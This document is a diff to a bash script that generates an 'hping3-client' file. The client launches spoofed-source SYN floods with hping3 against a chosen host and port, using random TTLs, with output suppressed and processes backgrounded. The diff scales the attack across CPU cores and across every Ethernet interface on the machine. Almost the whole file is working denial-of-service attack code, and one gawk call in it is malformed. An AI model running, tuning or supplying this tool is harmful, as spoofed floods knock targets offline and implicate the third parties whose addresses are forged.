@@ -1,3 +1,4 @@
+#!/bin/bash
 # hping3-client
 cat > hping3-client << EOF_CLIENT
 #!/bin/bash
@@ -7,6 +8,9 @@ atime=\$3
 ttl_pool=\$4
 thread=\$5
 ip_pool=\$6
+
+declare -a allif=($(ifconfig -a|grep 'eth'|gawk 'print $1'))
+num_allif=${#allif[@]}
 
 is_valid_ipv4 () {
     local address=\${1}
@@ -42,15 +46,22 @@ fi
 done
 }
 
-let sum=(\$thread)
+cores=\$(grep -c ^processor /proc/cpuinfo)
+let sum=\$((\$thread/cores))
+if [[ \$sum -eq 1 ]]
+then
+	sum=1
+fi
 #echo \$sum
-
-for i in \$(seq 1 1 \$sum)
+for j in \$(seq 1 1 \$sum)
 do
-        ttl=\$(shuf -i \$ttl_pool -n 1)
-	gen_ip \$ip_pool
-	#echo "hping3 -S -L 0 -a \$ip -p \$dport \$host -t \$ttl --flood"
-	hping3 -S -L 0 -a \$ip -p \$dport \$host -t \$ttl --flood 1>/dev/null 2>/dev/null &
+	for i in \$(seq 1 1 \$num_allif)
+	do
+   		ttl=\$(shuf -i \$ttl_pool -n 1)
+		gen_ip \$ip_pool
+		#echo "hping3 -S -L 0 -a \$ip -p \$dport \$host -t \$ttl --flood"
+		hping3 -S -L 0 -a \$ip -p \$dport \$host -t \$ttl --flood -I \${allif[\$((\$i-1))]} 1>/dev/null 2>/dev/null &
+	done
 done
 
 for i in \$(seq 1 1 \$atime)
